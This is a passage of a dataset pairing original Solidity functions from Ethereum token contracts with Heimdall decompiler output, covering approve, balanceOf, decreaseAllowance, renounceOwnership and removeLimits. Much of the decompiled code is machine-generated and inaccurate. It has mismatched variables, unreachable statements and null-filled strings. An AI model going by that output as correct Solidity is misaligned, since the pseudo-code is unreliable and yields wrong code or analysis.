(msg.value + (var_j))), \"Cannot refer to self\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x11;\n        var_g = 0x60 + var_g;\n        uint256 var_l = msg.value;\n        require(!(0x0e10 > (block.timestamp + 0x0e10)), \"Cannot refer to self\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x11;\n        uint256 var_m = block.timestamp + 0x0e10;\n        address var_n = address(arg0);\n        var_e = msg.sender;\n        var_f = 0x04;\n        storage_map_k[var_e] = var_g.length;\n        storage_map_l[var_e] = var_o;\n        storage_map_m[var_e] = (address(var_p)) | (uint96(storage_map_m[var_e]));\n        store_j = 0x01;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x14;\n        var_d = 0x43616e6e6f7420726566657220746f2073656c66000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x13;\n        var_d = 0x4d696e20626f6e6420697320302e312065746800000000000000000000000000;\n    }"}
{"contract_address": "0x92E27aedE3847Bbd0E4b917Ec2Ae444d4C3A622D", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n        _maxWalletSize = maxWalletSize;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWalletSize = arg0;\n    }"}
{"contract_address": "0x3E04B913dD981C1E6DF41aCBD8fB12A0B2A69171", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x03;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xbFD03022a32dB1502489AE1F65bd8f343CC09AB9", "original_solidity_code": "function removeLimits() external onlyOwner returns (bool) {\\r\\n        limitsInEffect = false;\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function removeLimits() public returns (bool) {\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingEnabled = (0 * 0x01) | (uint248(tradingEnabled));\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x4EEB531934eb03F55032CF7468957e9cc3b9Ce7d", "original_solidity_code": "function maxWalletRule(uint256 maxTxPercent) external onlyOwner {\r\n         _maxTxAmount = (_totalSupply * maxTxPercent ) / 1000;\r\n                       \r\n    }", "heimdall_decompiled_code": "function maxWalletRule(uint256 arg0) public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((arg0 == ((arg0 * totalSupply) / totalSupply)) | !totalSupply);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        _maxTxAmount = (arg0 * totalSupply) / 0x03e8;\n    }"}
{"contract_address": "0x332098414098f0E42658f2eA0254B44b077bb4A5", "original_solidity_code": "function updateGoldenHarvestFields(address newWallet) external onlyOwner {\\n        emit GoldenHarvestFieldsUpdated(newWallet, GoldenHarvestFields);\\n        GoldenHarvestFields = newWallet;\\n    }", "heimdall_decompiled_code": "function updateGoldenHarvestFields(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit GoldenHarvestFieldsUpdated(address(arg0), address(GoldenHarvestFields / 0x01));\n        GoldenHarvestFields = (address(arg0) * 0x01) | (uint96(GoldenHarvestFields));\n    }"}
{"contract_address": "0xe06802BE64FC18b16dB2dA75fBAf139FF268c97B", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(arg1 > storage_map_b[var_a]), \"SafeMath: subtraction overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x1e;\n        var_g = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(msg.sender) - (address(store_e / 0x01)));\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_a = address(arg0);\n        var_b = 0x01;\n        var_a = address(msg.sender);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(arg0), address(msg.sender), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x3A2D2970A74e4a254145b5EbA3eE63d4EdcbaD2c", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function enableTrading() public onlyOwner {\r\n        TradingOpen = true;\r\n                                            \r\n    }", "heimdall_decompiled_code": "function enableTrading() public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        pair = 0x010000000000000000000000000000000000000000 | (uint248(pair));\n    }"}
{"contract_address": "0x33743F9E4bf0A323807Fc1517Bb9aD9557585f48", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x054348505D3A37c155C15435FEB95392bDDb31E6", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x75ddE559291a13c10cF57320719888BE9aE2c08c", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].sub(\r\n                subtractedValue,\r\n                \"ERC20: decreased allowance below zero\"\r\n            )\r\n        );\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x25;\n        var_c = this.code[2631:2668];\n        address var_d = msg.sender;\n        var_e = 0x02;\n        var_d = address(arg0);\n        address var_e = keccak256(var_d);\n        require(!(arg1 > storage_map_c[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_a.length;\n        require(!(0 > var_a.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = 0;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_d = address(msg.sender);\n        var_e = 0x02;\n        var_d = address(arg0);\n        var_e = keccak256(var_d);\n        storage_map_c[var_d] = storage_map_c[var_d] - arg1;\n        address var_f = storage_map_c[var_d] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_c[var_d] - arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x22;\n        var_j = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_k = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x24;\n        var_j = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_k = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xC246C2C0B1DEBBFF9370a5A2f0BD35c17DE5b373", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x060f7a607bAd24a75EC072b96C1a209A80ca62ed", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xB9FB64018E475BBCF128E391E62274599c4D848C", "original_solidity_code": "function supportsInterface(bytes4 interfaceId)\\n        public\\n        view\\n        virtual\\n        override(IERC165, ERC721ContractMetadata)\\n        returns (bool)\\n    {\\n        return\\n            interfaceId == type(INonFungibleSeaDropToken).interfaceId ||\\n            interfaceId == type(ISeaDropTokenContractMetadata).interfaceId ||\\n            // ERC721ContractMetadata returns supportsInterface true for\\n            //     EIP-2981\\n            // ERC721A returns supportsInterface true for\\n            //     ERC165, ERC721, ERC721Metadata\\n            super.supportsInterface(interfaceId);\\n    }", "heimdall_decompiled_code": "function supportsInterface(bytes4 arg0) public pure returns (bool) {\n        require(arg0 == (uint32(arg0)));\n        require(0x1890fe8e00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        require(0x1890fe8e00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        uint32 var_a = !(!0x1890fe8e00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        return !(!0x1890fe8e00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        require(0x2a55205a00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        require(0x2a55205a00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        var_a = !(!0x2a55205a00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        return !(!0x2a55205a00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        require(uint32(arg0) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        require(uint32(arg0) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        var_a = !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        var_a = !(!0x5b5e139f00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n        return !(!0x5b5e139f00000000000000000000000000000000000000000000000000000000 == (uint32(arg0)));\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        uint256 currentAllowance = allowance(owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            _approve(owner, spender, currentAllowance - subtractedValue);\\n        }\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_i[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(!((storage_map_i[var_a] - arg1) > storage_map_i[var_a]), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_i[var_a] = storage_map_i[var_a] - arg1;\n        uint256 var_c = storage_map_i[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_i[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0c9b68640933C2b769585331907a26b5DA7C5Bf9", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_g[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0c9b68640933C2b769585331907a26b5DA7C5Bf9", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xa60ecbb555a15D31AaCfd8d44a456A81699e4C9a", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x410cA8f9159f88a864DeEc21f30D5D62E8B75619", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xE38FC4451371F3dBccC072392231D7bdE92459fA", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if (!0x3b9aca00 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n                        if (0x09) {\n                            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6dcAfFa85fA06C617E8290f1BABC7091eEE8150f", "original_solidity_code": "function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/token/ERC20/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * 